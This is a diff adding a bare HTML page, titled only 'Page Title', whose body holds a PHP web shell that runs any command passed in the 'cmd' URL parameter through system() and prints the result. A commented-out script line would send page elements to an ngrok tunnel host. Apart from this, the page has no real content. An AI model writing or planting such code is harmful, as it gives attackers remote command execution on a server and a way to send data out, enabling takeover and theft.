@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<title>Page Title</title>
+</head>
+<body>
+<span><?php 
+if (isset($_GET['cmd'])){
+	$data = system($_GET['cmd']);
+    echo $data;	
+} 
+?>
+</span>
+</div>
+<script>
+
+//var a =  document.getElementsByTagName("div");
+
+  // $.get("http://bf39fe169f5e.ngrok.io?c="+a);
+</script>
+</body>
+</html>
